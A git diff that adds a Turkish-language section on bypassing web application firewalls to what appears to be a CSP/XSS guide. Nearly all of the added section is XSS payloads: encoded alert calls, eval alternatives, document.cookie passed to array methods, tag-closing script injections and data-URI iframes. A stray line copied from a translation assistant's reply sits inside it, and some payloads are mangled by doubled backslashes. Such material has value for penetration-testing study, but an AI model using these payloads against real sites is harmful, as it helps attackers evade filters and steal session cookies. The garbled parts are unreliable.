@@ -188,6 +188,135 @@ Content-Security-Policy: default-src 'none'; script-src https://hello.vaadata.co
 ```url
 https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
 ```
+## WAF Bypass
+Tabii, verdiğin içeriği teknik terimlerini koruyarak Türkçeye çevirebilirim:
+
+---
+
+## WAF Bypass Teknikleri
+
+### String Kodlama (String Encoding)
+
+#### Base64 Kodlama:
+```javascript
+btoa("alert(1)");  // Base64'e kodlar
+atob("YWxlcnQoMSk=");  // Base64'ten tekrar "alert(1)" olarak çözer
+```
+
+#### Octal ve Heksadesimal Kodlama:
+```javascript
+\\141\\154\\145\\162\\164(1);  // "alert(1)" için sekizlik
+\\x61\\x6c\\x65\\x72\\x74(1);  // "alert(1)" için hex
+```
+
+#### Unicode Escaping:
+```javascript
+al\\u0065rt(1);  // Unicode kullanarak "alert(1)"
+```
+
+#### Decimal Kodlama:
+```javascript
+String.fromCharCode(97, 108, 101, 114, 116)(1);  // "alert(1)" çıktısı
+```
+
+#### String Birleştirme:
+```javascript
+var a = "al";
+var b = "ert(1)";
+a.concat(b);  // "alert(1)" çıktısı
+```
+
+### Parantez Engellerini Bypass Etme
+Bazı WAF’ler parantez veya alert() gibi belirli fonksiyonları engeller. Alternatifler:
+
+#### Backtick Kullanımı:
+```javascript
+alert`1`;  // Parantez kullanmadan alert
+```
+
+#### Event Handler Kullanımı:
+```html
+<img src="nonexistent.jpg" onerror="alert(1); throw 'Error';">
+```
+
+#### Throw Syntax Kullanımı:
+```javascript
+throw onerror=alert, "aaaa", "bbbb";
+```
+
+### Fonksiyon Kara Listeleri ve Alternatifler
+Eval() engellenmişse, aynı etkiyi sağlayacak alternatifler kullanılabilir:
+
+```javascript
+// Engellenmiş: eval("alert(1)");
+// Alternatifler:
+setTimeout("\\x61\\u{65}\\162t(2)");
+setInterval("\\x61\\u{65}\\162t(2)");
+Function("alert(2)")``;
+Function("alert(2)")();
+(Function("alert(2)"))();
+Function("alert(1)")();  // eval kullanmadan
+```
+
+#### Unicode ile Fonksiyon Çağrısı:
+```javascript
+\\x61\\u{65}\\162t(2);  // alert(2) ile aynı
+```
+
+### Dot Notation ve window Engellerini Bypass Etme
+Dot notation (ör. `document.cookie`) engellenmişse köşeli parantez kullan:
+
+```javascript
+document["cookie"];  // document.cookie yerine
+```
+
+Window kullanımını engelleyen WAF’ler için alternatifler:
+```javascript
+top;    // window.alert yerine
+self;   // self veya top kullan
+frames; // frames veya parent
+parent;
+this;
+```
+
+#### Array Kullanımı:
+```javascript
+[20].find(alert);   
+[document.cookie].find(prompt);
+```
+
+#### Gelişmiş Array Metodları:
+```javascript
+[document.cookie].forEach(prompt);  
+[document.cookie].filter(alert);    
+[document.cookie].map(alert);
+```
+
+#### Global Object Bypass:
+```javascript
+globalThis;  
+globalThis ;
+```
+
+### Tag Kapatma
+HTML’de çalıştırılamayan tag’leri kapatıp payload ekleme:
+
+```html
+<style>/* CSS, script çalışmaz */</style><script>alert(1)</script>
+<title>Page Title</title><script>alert(1)</script>
+<noembed>Fallback content</noembed><script>alert(1)</script>
+<template>This is template content</template><script>alert(1)</script>
+<noscript>Content when JS disabled</noscript><script>alert(1)</script>
+<textarea>User entered text</textarea><script>alert(1)</script>
+<!-- HTML Comment --> <script>alert(1)</script>
+```
+
+### iframe ile Payload
+
+```html
+<iframe src="data:text/html, <svg onload=alert(2)>">
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></iframe> <!-- alert(2) -->
+```
 
 ## XSS Saldırılarını Önlemek
 CSP, XSS gibi zafiyetlerin kötüye kullanılmasını sınırlayan veya önleyen ek bir koruma katmanı sağlar. Bu saldırılara karşı ilk savunma hattı hâlâ input validation ve output encoding yöntemleridir. Genel olarak, CSP aşağıdaki noktalar dikkate alınmalıdır:
